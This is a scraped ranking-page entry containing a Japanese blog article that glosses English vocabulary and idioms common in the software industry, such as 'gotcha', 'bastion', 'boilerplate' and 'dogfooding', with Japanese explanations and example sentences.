<p><em>もしこのガイドを楽しんでくれたのなら、または提案や質問があれば、コメントで知らせてほしい。また、バグを見つけたら気軽に<a href="https://github.com/dvf/blockchain" rel="nofollow noopener" target="_blank">ここ</a>にコントリビュートしてほしい！</em></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">14位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>526</kbd>
		<a target="_blank" href="https://qiita.com/tfutada/items/d1b17cd4008876c17bf4">コンピュータ業界でよく出る英語</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-23<br />08:57:52</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/75231.html">tfutada</a>(33件の記事)<br />(フリーランス 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/75231/profile-images/1473700099">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[プログラミング]</b> <b>[英語]</b> <b>[教育]</b> <b>[新人プログラマ応援]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>コンピュータ英語とビジネス英語の中間の英単語集です。<br>
続編もあるよ。<a href="https://qiita.com/tfutada/items/91d727ef435c18fb8dba" id="reference-4d8e5c81aba72d4d9403">英語リスニング&amp;スピーキング</a></p>

<h2>
<span id="名詞イディオム" class="fragment"></span><a href="#%E5%90%8D%E8%A9%9E%E3%82%A4%E3%83%87%E3%82%A3%E3%82%AA%E3%83%A0"><i class="fa fa-link"></i></a>名詞/イディオム</h2>

<p><strong>gotcha</strong><br>
はまりポイント。注意すべきこと。引っ掛け。<br>
Got you のくだけた表現。捕まえた、誰かをトラップに引っ掛ける、という意味から。</p>

<blockquote>
<p>類) caveat, pitfall<br>
There are many gotchas in this application.<br>
注) 別の意味で、あいづちの言葉(yeah)として常用してる人もいる。</p>
</blockquote>

<p><strong>sought-after</strong><br>
(スキル、人材、機能、アプリが) 人気の、需要がある、求められてる、引っ張りだこ </p>

<blockquote>
<p>Python is a sought-after language.</p>
</blockquote>

<p><strong>c-suite</strong><br>
執行役員。CEO, CTO, CFO, COO などの、Chief で始まる役職</p>

<p><strong>geek</strong><br>
コンピュータおたく。</p>

<blockquote>
<p>類) nerd<br>
geek talk オタクの会話。geeky 形容詞。geek vibe オタクが放つ雰囲気</p>
</blockquote>

<p><strong>lingo, jargon</strong><br>
業界用語。社内だけで使われてる単語</p>

<blockquote>
<p>類) technical term</p>
</blockquote>

<p><strong>canonical</strong><br>
正式な<br>
canonical name DNSのCNAMEレコード  ドメイン名がエイリアスでなく、正式な名前</p>

<blockquote>
<p>類) authentic 本物</p>
</blockquote>

<p><strong>de facto</strong><br>
(公式ではないけど)事実上の標準</p>

<blockquote>
<p>Npm is a de facto package manager for JavaScript.<br>
反) de jure 公式に</p>
</blockquote>

<p><strong>ingress/egress/midgress</strong><br>
もとは不動産用語で、他人の敷地に出入りする権利<br>
<code>ingress</code> インターネットの外からネットワーク内へのトラフィック<br>
<code>egress</code> インターネットへでてくこと<br>
<code>midgress</code> AkamaiなどのCDNサービスで、コンテンツが保存されているのソースサーバと世界中に配置したエッジサーバ間のトラフィック</p>

<p><strong>gadget</strong><br>
道具。ツール。アイテム。iPhone, apple watchなどのデバイス。</p>

<blockquote>
<p>類) gizmo<br>
high-tech gadget</p>
</blockquote>

<p><strong>agnostic</strong><br>
不可知論、無信心。から転じて、特定のOS、言語、フレームワークに依存しない。</p>

<blockquote>
<p>Makefile is agnostic, which can be used in any languages.</p>
</blockquote>

<p><strong>kudos</strong><br>
賞賛の意味。よくやった。おめでとう。すげー。</p>

<blockquote>
<p>類) Congrats!<br>
Kudos to you!</p>
</blockquote>

<p><strong>recap / roundup</strong><br>
まとめ、総括。Recapはチャットなどの最後に話した内容をまとめるときに使用する。Roundupは今週あったニュースのまとめ記事としてしようする。</p>

<blockquote>
<p>類) Tech news roundup</p>
</blockquote>

<p><strong>bastion</strong><br>
砦、要塞の意味から、bastion server で踏み台サーバの意味</p>

<blockquote>
<p>We need to login a bastion server in order to login the application servers.</p>
</blockquote>

<p><strong>linchpin</strong><br>
車止めのピン。一番大事なこと、人。急所。かなめ。</p>

<blockquote>
<p>The Model 3 is the linchpin of Tesla's business.</p>
</blockquote>

<p><strong>outage</strong><br>
停電から、サービスの停止。システムのダウン。</p>

<blockquote>
<p>類) blackout, disrupt</p>
</blockquote>

<p><strong>outlet</strong><br>
電源。コンセント。壁の横についているやつ。英語でコンセントは同意の意味。</p>

<p><strong>boilerplate</strong><br>
鋳型<br>
<code>Boilerplate codes</code> 毎回お約束でタイピングしないといけない、面倒なお約束のコード<br>
例えば、Goなら、<code>if err != nil {...}</code> が何度もお約束で書かないといけない。</p>

<blockquote>
<p>類) ceremony 儀式<br>
I am sick and tired of tying boilerplate codes.</p>
</blockquote>

<p><strong>ecosystem</strong><br>
生態系。最近、IT業界でよく使用される。複数の企業や、アプリケーションがお互いに協力しながらマーケット自体を成長させていく。<br>
<code>AIエコシステム</code> LINE Clovaではトヨタ、ファミマと提携し、複数の企業が協力して市場を成長させる戦略。</p>

<p><strong>go live, release</strong><br>
システム、サービスのリリース、運用開始</p>

<blockquote>
<p>類) deliver, due, cut over, roll out, unveil, ship<br>
kick off プロジェクトの開始</p>
</blockquote>

<p><strong>alpha, beta, RC, GA</strong><br>
プロダクトリリースまでのバージョンの付け方<br>
<code>RC release candidate</code> リリース候補バージョン<br>
<code>GA general availability</code> 正式バージョン (有償サポートの対象となる)</p>

<p><strong>hiccup</strong><br>
しゃっくり。システムが一時的に障害を起こすこと。</p>

<blockquote>
<p>類) intermittent たまに、断続的に発生すること</p>
</blockquote>

<p><strong>block chain</strong><br>
仮想通貨ビットコインで有名になった技術。中央銀行をもたず、参加しているユーザみんなで取引の信用性をベリファイする。</p>

<p><strong>best practice</strong><br>
一番良い方法</p>

<blockquote>
<p>What is the best practice to get the job done?<br>
この仕事を完了する一番良い方法は何だろうか？</p>
</blockquote>

<p><strong>plan B</strong><br>
代替案、代替策。万が一に備えた別のプラン。<br>
プランAがやりたいことだけど、ダメならプランBに変更する。</p>

<blockquote>
<p>We should come up with a plan B just in case.<br>
類) contingency 不測の事態</p>
</blockquote>

<p><strong>scratch</strong><br>
<code>from scratch</code> 横線を引いて取り消すから、もう一回、ゼロからやり直すの意味</p>

<blockquote>
<p>類) scrap and build</p>
</blockquote>

<p><strong>reinventing the wheel</strong><br>
車輪を再発明する。<br>
普通は、すでにあるものを使えば効率が良いのに、無駄な努力をする悪い意味で使用する<br>
<code>reinvent the phone</code> アップルの<code>iPhone</code>を指し、すでにあるものをぶち壊し、再発明する良い意味で使用されてる。</p>

<p><strong>false positive / false negative</strong><br>
誤検出。false positive は本当は正しいのに間違ってると判定すること。false negativeはその逆。メールのウイルスチェックなどでスパムではないのにスパムに分類してしまうこと</p>

<p><strong>black magic</strong><br>
黒魔術<br>
Rubyのモンキーパッチ(既存のクラスを動的に書き換えてしまう)のようななんだかよくわからないが動いてしまう魔法のようなことがら。コードの保守が複雑になるという否定的な意味もある。</p>

<p><strong>on steroids</strong><br>
ステロイド剤。筋肉を増強させることから、パワーアップ、エンハンスの意味。</p>

<blockquote>
<p>iOS Simulator on sterids  <a href="https://medium.com/flawless-app-stories/simulator-on-steroids-c12774ca6b" rel="nofollow noopener" target="_blank">iOSシミュレータの強化</a></p>
</blockquote>

<p><strong>plain vanilla</strong><br>
プレーンバニラ(アイス)、素の、ピュアな、シンプル<br>
トッピングとかしてない、カスタマイズやオプションをつけてない状態</p>

<blockquote>
<p>Vanilla JS jQueryと比べて超軽量なJSフレームワーク</p>
</blockquote>

<p><strong>cutting edge, bleeding edge, leading edge, state of the art</strong><br>
最先端技術</p>

<p><strong>status quo</strong><br>
現状維持</p>

<p><strong>Occam's Razor</strong><br>
オッカムの剃刀<br>
物事は単純に考えた方が良いという、less is more 的な言葉</p>

<p><strong>The Cathedral and the Bazaar</strong><br>
伽藍とバザール<br>
ソフトウエア開発においては、権威的、中央集権的な手法よりも、Linuxオープンソースのようなボランティア的、自発的な手法が効果的であること。</p>

<p><strong>Zero-day attack</strong><br>
セキュリティホールが発覚し、そのパッチの開発までの空白の時間をついて悪さすること。</p>

<p><strong>window</strong><br>
都合が良い空き時間。システムのリリースタイミングとして、深夜の1am-3amしか<code>window</code>がない。とか言う。</p>

<p><strong>hands-on</strong><br>
(話を聞くだけでなく)実際に手にとって体験してみる。<br>
(エクセルで線表引くだけでなく)実際に手を動かしてコードが書けるプロマネ <code>hands-on manager</code></p>

<p><strong>reg.</strong><br>
regular price<br>
本来なら ＄10だけどキャンペーンで無料です。と表現したいとき、<code>It's free (reg.＄10)</code>と記載する。</p>

<p><strong>blue ocean, red ocean</strong><br>
ビジネス戦略用語<br>
<code>red ocean</code>とは、自動車、携帯など、多くの企業が参入し競争原理の元に成長する市場。<br>
<code>blue ocean</code>はなにもないところから新たな市場を作り上げること。一人勝ちではあるが、新たなマーケットを作り出す戦略が必要。</p>

<p><strong>silver bullet</strong><br>
銀の弾丸<br>
技術の進歩が速く、Droneから人工知能まで多岐にわたるITの世界において、これさえあれば全てが解決するような魔法の開発手法、プロセス、ツールなど存在しない。ここの案件ごとにベストなやり方は変わる。</p>

<p><strong>one-size-fits-all</strong><br>
フリーサイズ、万能</p>

<blockquote>
<p>an one-size-fits-all way 万能な方法</p>
</blockquote>

<p><strong>on the fly, on the spot</strong><br>
その場で、即座に、瞬間的に</p>

<blockquote>
<p>類) spontaneously, instantly</p>
</blockquote>

<p><strong>adhoc</strong><br>
その場限り、場当たり的、一時的、即興</p>

<p><strong>behind the scenes, under the hood</strong><br>
映画の舞台裏、ボンネット(hood)の下<br>
から、システム、アプリケーションの裏の仕掛け</p>

<blockquote>
<p>Let's see how the system works behind the scenes.<br>
システムが実際裏でどう動いてるか見てみましょう。</p>
</blockquote>

<p><strong>noob</strong><br>
初心者。newbieの略。</p>

<blockquote>
<p>類) newb, beginner, starter, novice, rookie<br>
対してベテランの意味で使用する単語: seasoned, full fledged,  pro, veteran, skilled, expert, experienced, versatile, advanced, extraordinary<br>
まあ普通の意味: intermediate, mediocre</p>
</blockquote>

<p><strong>defect, bug, glitch, flaw</strong><br>
欠陥。バグ。</p>

<blockquote>
<p>We got some defects on the new release.</p>
</blockquote>

<p><strong>dud</strong><br>
失敗作。不発。駄作。かっこ悪いやつ。</p>

<blockquote>
<p>反) stud イカす</p>
</blockquote>

<p><strong>root cause</strong><br>
根本原因。バグの根本原因。</p>

<blockquote>
<p>We got to figure out the root cause of the trouble.</p>
</blockquote>

<p><strong>clue</strong><br>
手がかり</p>

<blockquote>
<p>We have no clue about what is causing the issue.<br>
この問題の手がかりがない。<br>
類) We have no idea.</p>
</blockquote>

<p><strong>regression</strong><br>
デグレ (和製英語なので注意)</p>

<blockquote>
<p>regression test 後退テスト</p>
</blockquote>

<p><strong>short notice</strong><br>
急な知らせ。急な告知</p>

<blockquote>
<p>So sorry for such short notice but we want to change the specification.<br>
急で申し訳ないけど、仕様変更します。</p>
</blockquote>

<p><strong>last minute changes</strong><br>
土壇場の変更。last-minute 土壇場</p>

<blockquote>
<p>We do not accept last minute design changes.<br>
土壇場のデザイン変更は受け付けません。</p>
</blockquote>

<p><strong>heads-up, FYI</strong><br>
お知らせ</p>

<blockquote>
<p>Just a heads-up for you. ちょっと連絡〜<br>
Thanks for the heads-up.　知らせてくれてありがとう。 </p>
</blockquote>

<p><strong>ring a bell</strong><br>
ピンとくる。思い当たる。知っている。</p>

<blockquote>
<p>The server settings have changed. Does it ring a bell? <br>
サーバーの設定が変わっている。何か思い当たる？<br>
That does not ring a bell. 知らないよ。</p>
</blockquote>

<p><strong>elephant in the room</strong><br>
空気を読んで見てみないふりをする。気づかないふり。<br>
外人にもKYなことはある。</p>

<p><strong>tall order</strong><br>
無理難題。難しい注文</p>

<blockquote>
<p>It's a tall order to get it done by the end of today.</p>
</blockquote>

<p><strong>work effort</strong><br>
工数</p>

<p><strong>time line</strong><br>
エクセル線表w、スケジュール</p>

<p><strong>on the right track</strong><br>
予定通り順調</p>

<blockquote>
<p>類) How is your project coming along?　プロジェクトの進み具合はどう？<br>
on schedule, behind schedule, ahead of schedule</p>
</blockquote>

<p><strong>crash course</strong><br>
短い時間でサクッとやる授業。講座。</p>

<blockquote>
<p>Let's have a crash course in Kotlin during lunch time.</p>
</blockquote>

<p><strong>binge watch</strong><br>
一気にシリーズアニメやドラマとか見ちゃうこと<br>
binge いっぺんになんかやること。どか食い</p>

<p><strong>vice versa</strong><br>
またその逆</p>

<blockquote>
<p>How to convert String to Int and vice versa. <br>
String型をInt型にする、またInt型をString型に変換する方法<br>
Switch mobiles from Android to iPhone and vice versa.</p>
</blockquote>

<p><strong>per se, itself</strong><br>
それ自体は。論文とかで使われる、かしこまった表現</p>

<blockquote>
<p>JavaScript does not support a Class mechanism per se. <br>
JavaScriptはクラスそのものはサポートしてない。</p>
</blockquote>

<p><strong>my two cents</strong><br>
取るに足らない意見ですが (謙虚なアドバイス) 。１セント硬貨は、約1円。ペニーとも呼ばれる<br>
メールの最後に記したりする。</p>

<blockquote>
<p>My two cents is that you should use Kotlin over Java.<br>
類) in my humble opinion IMHO</p>
</blockquote>

<p><strong>pet peeve</strong><br>
他の人には気にならなくても、自分はなんかイラっとくること<br>
One of my biggest pet peeves is people who touch my screen with dirty fingers.</p>

<p><strong>technical debt</strong><br>
(リファクタリングせずに)システムの改修を繰り返すと、だんだんとシステムの辻褄が合わなくなり、改修の効率が悪くなってくる。<br>
理想的には定期的な棚卸し、オーバーホールが必要になる。</p>

<p><strong>quick and dirty solution</strong><br>
やっつけで直す。早いけど汚い。</p>

<p><strong>workaround</strong><br>
回避策。応急処置。</p>

<blockquote>
<p>類) hack 名詞で使う場合。ライフハック。</p>
</blockquote>

<p><strong>procrastination</strong><br>
やるべきことをすぐやらず、ズルズルと先延ばすこと。怠け。<br>
You've got to do what you've go to do. </p>

<p><strong>I'm done.</strong><br>
やったよ。(タスクが)終わったよ。</p>

<blockquote>
<p>I'm done with the task.</p>
</blockquote>

<p><strong>snippet</strong><br>
コードの断片。gist<br>
類) excerpt</p>

<p><strong>interpolation</strong><br>
挿入する、改ざんする。文字列リテラルの中に、変数を挟み込むこと。ES6なら、<code>Hello ${var}</code></p>

<p><strong>blah, blah, blah...</strong><br>
なんとかかんとか。文章が長くて、全部言うのが面倒なのときに、以下省略の意味で使う。(以下同文的な)</p>

<p><strong>as follows, the following, as shown below</strong><br>
以下のように<br>
as followings は間違い。</p>

<blockquote>
<p>To fix it, run commands as follows.<br>
To fix it, run the following commands.<br>
To fix it, run the commands as shown below.</p>
</blockquote>

<p><strong>underneath</strong><br>
〜の下に</p>

<blockquote>
<p>Let's place a Textfield here. テキストフィールドをここに置きます。<br>
Underneath, place a Button.　その下に、ボタンを配置しましょう。</p>
</blockquote>

<p><strong>John Doe, Jane Doe</strong><br>
アメリカの刑事ドラマには必ず出る単語で、亡くなった被害者を指す。<br>
男性ならJohn Doe, 女性ならJane Doe<br>
日本語で言えば、<code>仏</code><br>
サンプルコードで<code>山田太郎</code>的にたまに使われる</p>

<p><strong>threshold</strong><br>
しきい値</p>

<p><strong>pros and cons</strong><br>
長所、短所。良い点、悪い点。</p>

<blockquote>
<p>類) bright side and dark side, up side and down side</p>
</blockquote>

<p><strong>perks</strong><br>
メリット、特典、良い点<br>
類) pros</p>

<p><strong>CV (Curriculum Vitae)</strong><br>
履歴書。resume</p>

<p><strong>JD</strong><br>
job description<br>
募集要項。どんな仕事内容か、求めるスキル、人物、給料、福利厚生などが記載。</p>

<p><strong>STEM (science, technology, engineering and mathematics</strong><br>
アメリカは学歴社会で大学で何を学んだかがすごい大事。と言うか、勉強しないと大学を卒業できないし、在学中にインターンでスタートアップ企業で働いたりする。<br>
また、中国、インドなどの外国人がアメリカで就業ビザ(H1-B)を取得する場合、理系の学部を卒業していないと審査に通るのが難しい。</p>

<p><strong>diversity</strong><br>
多様性<br>
アメリカでは白人男性だけでなく、女性、アジア人、黒人、障害がある人、から公平に採用する必要がある。フェイスブックやアップルが白人男性が多いんではという批判がある。その一方、グーグルはトップがインド人だし、Google I/Oなどのカンファレンスのスピーカは色々な人種がいて見てて楽しい。</p>

<p><strong>soft skill, hard skill</strong><br>
<code>soft skill</code> コミュ力とか人間性のスキル。お客さんとちゃんと話せるとか。<br>
<code>hard skill</code> Python, Swiftとか技術的なスキル。ソフトウエアだけど。。。</p>

<p><strong>rockstar developer/programmer</strong><br>
２つの真逆な意味があり、スーパーできるカリスマ開発者と、気難しい自分勝手な開発者の２つの意味がある<br>
(というか、天才とは大概気難しいものであり、天才にコミュ力を求めてはいけない)</p>

<blockquote>
<p>類) You rock! あなたはすごい、面白い。</p>
</blockquote>

<p><strong>advocate</strong><br>
エバンジェリスト。プリセールス。<br>
Googleには、<code>developer advocate</code>という仕事があり、エンジニアに向けて最新技術をわかりやすく紹介する仕事がある。<br>
Firebaseは、<code>advocate</code>の人が、YouTubeにチュートリアルビデオをたくさんアップしている。<br>
Google I/Oなどのイベントでプレゼンターとして登壇する。</p>

<p><strong>first-class citizen, first-class object</strong><br>
第1級市民、第1級オブジェクト<br>
例えば、JavaScriptの関数は、関数の引数、戻り値として使用できるので第1級のオブジェクト、つまり、数値や文字列と同様に、市民権を得た存在である。Javaでは関数を渡すことが出来ない。<br>
また、Kotlinが正式にAndroidの開発言語になったことを受けて、Kotlin is a first-class citizen in Android. と表現している。<br>
<a href="https://en.wikipedia.org/wiki/First-class_citizen" rel="nofollow noopener" target="_blank">正確な定義はこちら</a></p>

<p><strong>SRE (Site Reliability Engineering)</strong><br>
社内システムの保守<br>
DevOpsと似ているが、社内システムの保守をインフラだけでなく、アプリも積極的にみるフルスタックな仕事。</p>

<p><strong>culmination</strong><br>
完成形。頂点。最高点。集大成。</p>

<blockquote>
<p>React Fiber is the culmination of over two years research by the React team.<br>
React Fiberは、Reactチームによるこの2年の研究の集大成です。</p>
</blockquote>

<p><strong>gig</strong><br>
仕事。転職する。<br>
元々は音楽業界で、ライブミュージシャンの演奏のお仕事をさす。</p>

<blockquote>
<p>類) job<br>
My next gig is at Google. 次の私の仕事はGoogleです。<br>
<code>攻殻機動隊 S.A.C. 2nd GIG</code> 公安9課の再結成</p>
</blockquote>

<p><strong>buck</strong><br>
お金。ドル。<br>
$10 のことを 10bucksという。発音は<code>ボックス</code>と聞こえる。</p>

<p><strong>POC (Proof Of Concept)</strong><br>
仮説(アイデア)を検証すること。プロトなど、本当に動くかどうか作って検証すること。</p>

<p><strong>game changer</strong><br>
試合の流れを変える人。今までのマーケットを変える、革新的な商品、サービス。iPhone、ポケモンGo、Drone、無人自動車など</p>

<p><strong>Mojo</strong><br>
魔力、魅力。パワー。精力。<br>
I've lost my Mojo. <a href="https://www.youtube.com/watch?v=0pGIwyl-IJ4" rel="nofollow noopener" target="_blank">コメディ映画オースティンパワーズ</a>で使用されて有名</p>

<blockquote>
<p>Apple has lost its Mojo since Steve Jobs has passed away.<br>
アップルはスティーブ・ジョブスを失ってからその魔力を失った。</p>
</blockquote>

<p><strong>gimmick</strong><br>
マーケティング的なあっと驚かせる仕掛け。もとはおもちゃなどのからくり、仕掛けの意味。</p>

<p><strong>easter egg</strong><br>
３月、４月にあるイースタ(復活祭)で使用する、カラフルな卵。<br>
ITでeaster eggというと、開発者がおふざけでアプリに隠しコマンド的なものを仕込むもの。<br>
<a href="https://en.wikipedia.org/wiki/List_of_Google_Easter_eggs" rel="nofollow noopener" target="_blank">Googleのイースターエッグ</a></p>

<p><strong>Swiss Army Knife</strong><br>
いろんな機能が詰まっている意味。万能。<br>
スイスアーミーナイフ</p>

<p><strong>Kitchen Sink</strong><br>
iOS、Android、JavaScript(CSS)などのUIコンポーネントライブラリのカタログ<br>
<code>everything but the kitchen sink</code> 重たい流し台以外は、何でもかんでもありの意味。<br>
ヒラリークリントンの大統領選挙の戦略でも使用された</p>

<p><strong>out of the box</strong><br>
(2つの別の意味がある。)<br>
箱から出すだけで、簡単に使えるよ。Macとか、ソフトウェアを箱から出すだけで、Windowsのような面倒な設定は入りませんよ。<br>
一方で、斬新なアイデア。型破りな。常識にとらわれない。奇想天外の意味もある。</p>

<blockquote>
<p>All the Apple products are out of the box, while Windows are terrible.<br>
We need to come up with out of the box ideas to compete our competitors.</p>
</blockquote>

<p><strong>eureka moment, aha! moment</strong><br>
ギリシャ語で分かった、ひらめいた、謎が解けた、の意味。<br>
アルキメデスがお風呂に入っている時に、金の含有率を調べる方法をひらめいて<code>ユーレカ！</code>と叫んだ。<br>
何か良いビジネスアイデアが浮かぶ瞬間。</p>

<p><strong>make (your) life easier</strong><br>
物事を楽にする</p>

<blockquote>
<p>Keyboard shortcuts makes your life easier.</p>
</blockquote>

<p><strong>What's going on?</strong><br>
どうなってるの？何がおきてるの？</p>

<p><strong>no big deal</strong><br>
大した問題ではない</p>

<p><strong>so far so good</strong><br>
今のところ順調。ここまでは問題ない。</p>

<p><strong>make a deal</strong><br>
取引成立</p>

<blockquote>
<p>動詞) deal with 処理する。取り扱う。</p>
</blockquote>

<p><strong>caveat, caution, warning, notice, note</strong><br>
注意。キャビアと発音する。</p>

<p><strong>protip</strong><br>
プロフェッショナルからのアドバイス</p>

<p><strong>cliche</strong><br>
お約束の決まり文句。</p>

<blockquote>
<p>Reboot a computer if you have a problem with it. It's a tech cliche.</p>
</blockquote>

<p><strong>having said that, with that said, that being said</strong><br>
とは言うものの。そうは言ったけど。<br>
アメリカのアメリカンアイドル(素人のど自慢みたいな番組)の審査員がよく使用した言葉で、最初にこき下ろしといて、だけどー、良かったよ。</p>

<blockquote>
<p>類) but, however</p>
</blockquote>

<p><strong>with that in mind, on top of that</strong><br>
それを踏まえて。その点を気に留めて。</p>

<p><strong>might(may) want to do〜</strong><br>
〜すると良いですよ。(丁寧な言い方)</p>

<blockquote>
<p>had better は上から目線な言い方なので避ける<br>
You might want to install this tool. このツールをインストールしておくと良いですよ。</p>
</blockquote>

<p><strong>cheat</strong><br>
騙す。ずる。<br>
cheat sheet カンニングペーパー。JavaScriptなど言語のシンタックスやメソッドの使い方などを１枚ぺらに簡潔にまとめたもの</p>

<p><strong>feature, characteristic</strong><br>
特徴。フィーチャーであり、ヒューチャーではない。</p>

<blockquote>
<p>feature phone ガラケー</p>
</blockquote>

<p><strong>on-premise, on-prem</strong><br>
自社システム</p>

<blockquote>
<p>反) cloud クラウド</p>
</blockquote>

<p><strong>authentication and authorization</strong><br>
認証と認可<br>
<code>認証</code> ユーザが誰かをID/パスワード、生体認証などで特定すること<br>
<code>認可</code> admin/staffなど、認証済みユーザに、どんな利用権限を与えるか</p>

<p><strong>guy, stuff, thing</strong><br>
こいつが、これ、あれ、もの<br>
日本語でも、「この子どこに置けばいい」と擬人表現するのに似ている。<br>
ホワイトボードでシステム構成を説明しているとき、サーバの絵を指で指しながら</p>

<blockquote>
<p>This guy deals with HTTP requests. <br>
こいつがHTTPリクエストを処理します。<br>
と言う。</p>
</blockquote>

<p><strong>ditto</strong><br>
同上。同意。</p>

<p><strong>hunch, guess</strong><br>
gut feeling, gut instinct<br>
推測。カン。</p>

<blockquote>
<p>My gut feeling tells me that AI could outperform humans.<br>
My hunch is... AI could outperform humans.</p>
</blockquote>

<p><strong>aka (also known as)</strong><br>
別名。〜とも知られてる</p>

<blockquote>
<p>ECMA2015 aka ES6</p>
</blockquote>

<p><strong>voila!, ta-da!</strong><br>
ジャジャーン (口で言う効果音的)<br>
アプリのデモなどで実際に動かすとき効果音的に、<code>voila</code>という。<br>
フランス語から。Etをつける場合もある。<br>
フランスのレストランでウェイターが料理を持って来たときに言うらしい。</p>

<p><strong>criteria</strong><br>
検索条件。基準。単数形は<code>criterion</code></p>

<p><strong>point</strong><br>
ポイント。言いたいこと。</p>

<blockquote>
<p>What is your point? 何が言いたいの？どういう意味？</p>
</blockquote>

<p><strong>when it comes to, in terms of, as for, as to, from xxx perspective</strong><br>
〜について言うと。〜に関して。</p>

<blockquote>
<p>類) about<br>
When it comes to design, the notch of iPhone X is obstructive.</p>
</blockquote>

<p><strong>according to〜</strong><br>
〜の情報よれば。人とか物とかからの情報。</p>

<blockquote>
<p>According to my boss, we will go with Kotlin.</p>
</blockquote>

<p><strong>nitty-gritty</strong><br>
物事の核心、本質</p>

<p><strong>in a nutshell</strong><br>
簡単に言えば、要約すれば</p>

<blockquote>
<p>類) long story short. TL;DR</p>
</blockquote>

<p><strong>bottom line, takeaways</strong><br>
大事なポイント。会計処理で一番最後に純利益(損失)を記すことから。<br>
一番言いたいこと。要点。</p>

<p><strong>one more thing...</strong><br>
スティーブジョブスのキーノートでの<a href="https://www.youtube.com/watch?v=hyCzbXx9i-M" rel="nofollow noopener" target="_blank">決め台詞</a><br>
(あ、そうだ、皆さんに紹介する新製品が)もう一つあるよ。と最後に勿体ぶって新製品を発表する。<br>
このセリフを真似るスピーカが結構いる。</p>

<p><strong>chit-chat, small talk</strong><br>
ちょっとしたおしゃべり。雑談。</p>

<p><strong>once〜</strong><br>
~した後で</p>

<blockquote>
<p>類) when, after<br>
Once downloaded, unzip it.<br>
Once you get it installed, run the command below.</p>
</blockquote>

<p><strong>median, mean(average)</strong><br>
中央値(メジアン)と平均値(mean)<br>
中央値とは、数値を昇順に並べたときに真ん中にくる数値<br>
平均値は、全部の数を足して、母数で割ったもの(我々が普段使うやつ)<br>
例) １、５、５、１０、３０００　<br>
中央値はは５になる(左から数えて３番目の数値)　<br>
偶数の場合は真ん中が２つあるため、その２つの数値の平均値を中央値にする。<br>
平均値は (1+5+5+10+3000) / 5 = 3021/5 = 604.2<br>
アメリカの統計データではよくメジアンが使用される。<br>
例えばシリコンバレーのエンジニアの平均給料を計算するとき<br>
ロックスターエンジニアとブルーワーカーエンジニアでものすごい所得格差があるため<br>
平均値を使用すると物すごく高い値になってしまうから。</p>

<p><strong>omni channel</strong><br>
オムニチャネル。Amazon Goの無人コンビニ、スマートスピーカーのように、Webだけでなく、いろいろな販売チャネルを用意すること。</p>

<p><strong>brick and mortar</strong><br>
レンガとセメント。(ネットショップに対して)実店舗をさす。<br>
アメリカではトイザらスなど実店舗がネットショップに顧客を取られている。</p>

<p><strong>bozo explosion</strong><br>
会社ができない人だらけになること<br>
アップルの初期のエバンジェリストで有名な<a href="https://youtu.be/rWv-KoZnpKw?t=744" rel="nofollow noopener" target="_blank">ガイ カワサキの説明</a>では<br>
A Player は A+ Player を採用するが、B Player は C Player を採用する<br>
その結果、いつしか組織は Z Player でいっぱいになる</p>

<p><strong>chasm</strong><br>
新しいプロダクトやサービスが浸透するには<br>
超えなければならない大きな壁がある<br>
ただし、それを一度超えてしまうとあとは爆発的に浸透していく<br>
もちろん、そのキャズム越えが一番難しく、ほとんどの場合、その手前で終わってしまう</p>

<p><strong>Singularity</strong><br>
(技術的)特異点<br>
AIが人類を超越してしまうとき<br>
2045年問題とも言われるが、最近のAIの加速度的な進歩を見ると、もっと早くおとづれそうである。<br>
Alpha Goが囲碁で人間を打ち負かすなど。</p>

<p><strong>tipping point</strong><br>
<a href="https://en.wikipedia.org/wiki/Malcolm_Gladwell" rel="nofollow noopener" target="_blank">マルコム・グラッドウェル</a>によって広められた言葉で、社会現象などがある点において突如として広まる現象(バズる)<br>
ジャスティンビーバのtweetで、ピコ太郎のPPAPが爆発的に広まったようにネットの情報に影響されやすい現代は、tipping pointを超えると一気に広まる。</p>

<p><strong>outlier</strong> <br>
<code>マルコム</code>はベストセラー書籍をたくさん出しており<br>
統計学で、平均からすば抜けて突出した人、物を指す。<br>
機械学習においての異常値(abnormal)<br>
彼の書籍では、ビルゲイツやビートルズのような超人が生まれる理由を説明している (答え: 日々コツコツ情熱を持ってやること)</p>

<p><strong>dogfooding</strong><br>
Eating your own dog food.<br>
自社製品(ドッグフード)を日々の業務で使用して、製品の改善点を発見する手法。<br>
AWS, Google, Facebookなどは、自らの技術を自社アプリ、サービスに適用して成功している良い例。</p>

<p><strong>growth hacking</strong><br>
従来のマーケティング手法(新聞、TV広告)ではなく、SNS、FB、Twitter、Google Analyticsとかそういったネットのサービス、技術を使用して<br>
長期的(ロングテイル)にユーザを獲得していく。</p>

<p><strong>internet meme (ミーム)</strong><br>
SNSで爆速で拡散していく小ネタ、おもしろ動画、画像などの情報をさす。<br>
ちなみにinternetの<code>i</code>は小文字で表記するように変わった。</p>

<p><strong>PayPal mafia</strong><br>
<a href="https://en.wikipedia.org/wiki/Peter_Thiel" rel="nofollow noopener" target="_blank">ピーターティエール</a>とその一味w<br>
ヒラリー支持だったシリコンバレーを裏切り、<br>
ちゃっかりトランプについた<code>Peter Thiel</code>は<code>PayPal</code>の創始者である。<br>
PayPalには、Tesla, SpaceXと今一番注目を集める Elon Musk、<br>
その他のメンバーも、LinkedIn, Palantir, YouTube, Yelp, Yammerを立ち上げており、<br>
Thielと当時のPayPalメンバー達を<code>PayPal mafia</code>と呼ぶ</p>

<p><strong>Elon Musk</strong><br>
ジョブス亡き後、カリスマとなりつつある<a href="https://en.wikipedia.org/wiki/Elon_Musk" rel="nofollow noopener" target="_blank">イーロンマスク</a><br>
テスラ自動車、Falcon 9の歴史的なロケット再利用打ち上げ成功<br>
Elon Muskは人類の希望の星である。<br>
